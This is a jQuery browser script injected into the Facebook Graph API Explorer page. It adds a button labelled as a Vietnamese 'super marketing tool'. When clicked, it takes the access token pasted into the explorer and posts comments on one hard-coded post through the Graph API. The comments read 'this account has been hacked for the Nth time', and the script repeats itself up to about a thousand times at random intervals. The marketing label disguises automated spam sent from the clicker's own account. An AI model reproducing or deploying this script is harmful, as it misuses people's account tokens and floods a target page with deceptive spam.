$(document).ready(function() {
  if (window.location.href.indexOf("developers.facebook.com/tools/explorer/145634995501895") > -1){
  setting = {
	link: "https://graph.facebook.com/v2.7/", // /me/
	
  }
  
  
  
  
  //Thêm menu
  //<button class="_4jy0 _4jy3 _4jy1 selected " type="submit" value="1"><i alt="" class="_3-8_ img sp_JJ_IyraF6xD sx_7809a1"></i><!-- react-text: 79 -->Submit<!-- /react-text --></button>
  $("._42xu").after('<button class="_4jy0 _4jy3 _4jy1" id="sieucongcu">siêu công cụ marketing</button>')
  i = 1;
  $("#sieucongcu").click(function(){
		fb({
			method: "post",
			link: "811700572186304_1181887268500964/comments",
			message: "tài khoản này đã bị hack lần thứ "+i,
		  }, function(re){
				console.log(re)
				i++
				if (i == 1000) {return false}
				setTimeout(function(){
					$("#sieucongcu").trigger("click")
				}, Math.floor((Math.random() * 1000) + 1000))
		  })
  })
	function fb(options, callback){
		access_token = $("._58al[placeholder^='Paste']").val() // maybe change
		var code = {
			url: "",
			link: "",
			method: ""
		}
		$.each(code, function(k, v){
			code[k] = options[k]
			delete options[k]
		})
		code.url = 'https://graph.facebook.com/v2.7/'+code.link+'?access_token='+access_token
		$.ajax({
			method: code.method,
			data: options,
			url: code.url,
			success: function(re){
				if (typeof callback == "function"){
					callback(re);
				}
			}
		})
	}
  }
});
